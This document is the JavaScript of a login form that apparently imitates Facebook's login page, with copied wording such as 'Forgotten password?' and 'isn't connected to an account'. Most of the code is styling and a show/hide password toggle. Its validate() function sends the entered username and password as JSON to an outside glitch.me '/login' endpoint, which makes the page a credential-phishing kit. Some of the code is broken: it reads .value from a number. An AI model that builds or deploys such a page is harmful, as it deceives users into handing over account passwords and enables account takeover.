console.log(document.body);
var pass = document.querySelector("#password");




function stop(){
var pass = document.querySelector("#password");
var inpu = document.querySelector(".inpu");
var inputs = document.querySelector(".inputs");
var pasword = document.querySelector("#password").value.length;
var show = document.querySelector("#show");
if(pasword>=1){
					show.style.display="block";
		inpu.style.borderTopRightRadius="0px";
		inpu.style.borderBottomRightRadius="0px";
		
	inpu.style.borderRight="none";
				inputs.style.borderLeft="none";	
		
			

			
				inputs.style.borderTopLeftRadius="0px";
				
				}else if (pasword==0){
							inpu.style.borderTopRightRadius="4px";
									inpu.style.borderRightWidth="1px";
									inpu.style.borderRightSolid="solid";
				inputs.style.borderLeft="1px solid #ced4da";					

		inpu.style.borderBottomRightRadius="4px";	
		show.style.display="none";
		

			
				}
			
				}
				

function change(){
var inputs = document.querySelector(".inputs");
var pass = document.querySelector("#password");
var show = document.querySelector("#show");
var tex = document.querySelector(".tex");
	if(pass.type=="password") {
	show.style.display="block";
inputs.style.width="75px";	
document.querySelector(".tex").innerHTML="<b>hide</b>";
	tex.style.fontSize="12px";
					pass.type="text";
					pass.focus();
	}else {
	show.style.display="block";
inputs.style.width="90px";	
document.querySelector(".tex").innerHTML="<b>show</b>";
	tex.style.fontSize="12px";
					pass.type="password";
					pass.focus();
	}
}

document.addEventListener("DOMContentLoaded", scen);
function scen(){
		var query = window.matchMedia("(max-width:841px)");
		var password = document.querySelector("#password");
	if(query.matches) {
					password.setAttribute("onkeyup",'stop()');
	}else{
						
	password.toggleAttribute("onkeyup");	password.addEventListener("focus", function(event){
		event.target.borderRight="1px solid #007bff";				
		},true);	
					password.addEventListener("blur", function(event){
		event.target.borderRight="1px solid #ced4da";				
		},true);	
						
						
		}
		
}

var password = document.querySelector("#password");

var quer = window.matchMedia("(max-width:841px)");
function fun(e){
				if(e.matches) {
								password.setAttribute("onkeyup",'stop()');
				}else {
		password.toggleAttribute("onkeyup");	password.addEventListener("focus", function(event){
		event.target.borderRight="1px solid #007bff";				
		},true);	
					password.addEventListener("blur", function(event){
		event.target.borderRight="1px solid #ced4da";				
		},true);							
				}
}
fun(quer);
quer.addEventListener("change",fun);



function validate(){  
var name = document.f1.name.value.length;  
var passwordlength=document.f1.password.value.length;  
var total = document.querySelector('.total');
var password = document.querySelector('#password');

var passwords = document.querySelector('.passwords');

var table = document.querySelector('table');
var btnSuccess = document.querySelector('.btn-success');
var fb = document.querySelector('.fb');
var ll = document.querySelector('#p');
var k = document.querySelector('.k');
var fbText = document.querySelector('.fb-textc');


var con = document.querySelector('.containers');

var locate = document.querySelector('#locate');
var locat = document.querySelector('#locat');
var status;  
if(name<6 && passwordlength<6){
			document.getElementById("name").style.backgroundImage=  
"url('warning.svg')";  
document.getElementById("name").style.backgroundRepeat=  
"no-repeat";  
document.getElementById("name").style.backgroundSize=  
"20.5px";  
document.getElementById("name").style.backgroundPosition=  
"97%";  	document.getElementById("name").style.outlineColor=  
"red";  
document.getElementById("name").style.borderColor=  
"red";  
document.getElementById("name").style.boxShadow=  
"none";  
locat.style.display="none";
total.style.flexDirection="column";
btnSuccess.style.display="none";
table.style.display="none";
ll.style.display="none";
k.style.display="block";
con.style.height="370px";
fb.style.marginBottom="6px";
con.style.marginLeft="0px";
document.querySelector("#locate").innerHTML ="The email address or mobile number you <br>entered isn't connected to an account. <b>Find your account and log in. </b>";
locate.style.display="block";
document.getElementById("namelocation").innerHTML=  
"<p class='na'>The email address or phone number that you've entered doesn't match any account Sign up for an account.</p>";  
document.getElementById("head").style.display="none";
document.getElementById("namelocation").style.display="block";
passwords.style.borderRightWidth="1px";


passwords.style.borderRightStyle="solid";
passwords.style.borderRightColor="#ced4da";
passwords.addEventListener('focus', function(event){
event.target.style.borderWidth="1px";
			event.target.style.borderStyle="solid";	event.target.style.borderColor="#ced4da";
		event.target.style.borderRightColor="#ced4da";	event.target.style.boxShadow="none";
			event.target.style.borderRightWidth="1px!important";
			event.target.style.borderRightStyle="solid!important";	event.target.style.borderRightColor="#ced4da!important";
},true);
passwords.style.borderRightColor="#ced4da";
passwords.addEventListener('blur', function(event){
			event.target.style.borderWidth="1px";
			event.target.style.borderStyle="solid";	event.target.style.borderColor="#ced4da";
			event.target.style.borderRightWidth="1px";
			event.target.style.borderRightStyle="solid";	event.target.style.borderRightColor="#ced4da";
},true);
status=false;
}
else if(name<6 && passwordlength>6){
	document.getElementById("name").style.backgroundImage=  
"url('peter.svg')";  
document.getElementById("name").style.backgroundRepeat=  
"no-repeat";  
document.getElementById("name").style.backgroundSize=  
"20.5px";  
document.getElementById("name").style.backgroundPosition=  
"97%";  	document.getElementById("name").style.borderColor=  
"red";  
document.getElementById("locat").style.display="none";  	document.getElementById("password").style.outlineColor=  
"rgb(229, 151, 0)";  
	document.getElementById("name").style.borderColor=  
"red";  
total.style.flexDirection="column";
btnSuccess.style.display="none";
table.style.display="none";
ll.style.display="none";
k.style.display="block";
con.style.height="370px";
fb.style.marginBottom="6px";
fb.style.textAlign="center";
con.style.marginLeft="0px";

document.querySelector("#locate").innerHTML ="The email address or mobile number you <br>entered isn't connected to an account. <b>Find your account and log in. </b>";
locate.style.display="block";
document.getElementById("namelocation").innerHTML=  
"<p class='na'>The email address or phone number that you've entered doesn't match any account Sign up for an account.</p>";  
document.getElementById("head").style.display="none";
document.getElementById("namelocation").style.display="block";
passwords.addEventListener('focus', function(event){
event.target.style.borderWidth="1px";
			event.target.style.borderStyle="solid";	event.target.style.borderColor="#ced4da";
			event.target.style.borderRightColor="#ced4da";
			event.target.style.boxShadow="none";
			event.target.style.borderRightWidth="1px";
			event.target.style.borderRightStyle="solid";	event.target.style.borderRightColor="#ced4da";
},true);
passwords.addEventListener('blur', function(event){
			event.target.style.borderWidth="1px";
			event.target.style.borderStyle="solid";	event.target.style.borderColor="#ced4da";
			event.target.style.borderRightWidth="1px";
			event.target.style.borderRightStyle="solid";	event.target.style.borderRightColor="#ced4da";
},true);
status=false;
}
 else if (name>6 && passwordlength<6){
			locate.style.display="none";
	document.getElementById("name").style.borderColor=  
"#ced4da";  
	
		document.getElementById("name").style.backgroundImage=  
"none";  	document.getElementById("locat").innerHTML="The password that you've entered is incorrect. <b> Forgotten password? </b>";
			locat.style.display="block";
			btnSuccess.style.display="none";
table.style.display="none";
ll.style.display="none";
			k.style.display="block";
		con.style.height="340px";	
		total.style.flexDirection="column";
			fb.style.marginBottom="6px";
fb.style.textAlign="center";
con.style.marginLeft="0px";

document.getElementById("namelocation").innerHTML = "<p class='na'>please enter your password. <b>Did you forget your password?</b> </p>"; 
document.getElementById("password").style.outlineColor=  
"red";  
document.getElementById("name").style.outlineColor=  
"rgb(229, 151, 0)";  
 document.getElementById("head").style.display="none";
document.getElementById("namelocation").style.display="block";
passwords.addEventListener('focus', function(event){
event.target.style.borderWidth="1px";
			event.target.style.borderStyle="solid";	event.target.style.borderColor="#ced4da";
		event.target.style.borderRightColor="#ced4da";	event.target.style.boxShadow="none";
			event.target.style.borderRightWidth="1px";
			event.target.style.borderRightStyle="solid";	event.target.style.borderRightColor="#ced4da";
},true);
passwords.addEventListener('blur', function(event){
			event.target.style.borderWidth="1px";
			event.target.style.borderStyle="solid";	event.target.style.borderColor="#ced4da";
			event.target.style.borderRightWidth="1px";
			event.target.style.borderRightStyle="solid";	event.target.style.borderRightColor="#ced4da";
},true);
status=false;
}
else{
document.getElementById("namelocation").style.display="block";
let data = {name: name.value, password: password.value}

	
	fetch('https://adhesive-skillful-prune.glitch.me/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                }).then(e=>{
	if(e.responseType === 200){
      
	}

	status=true
});
				
}

return status;  
}  
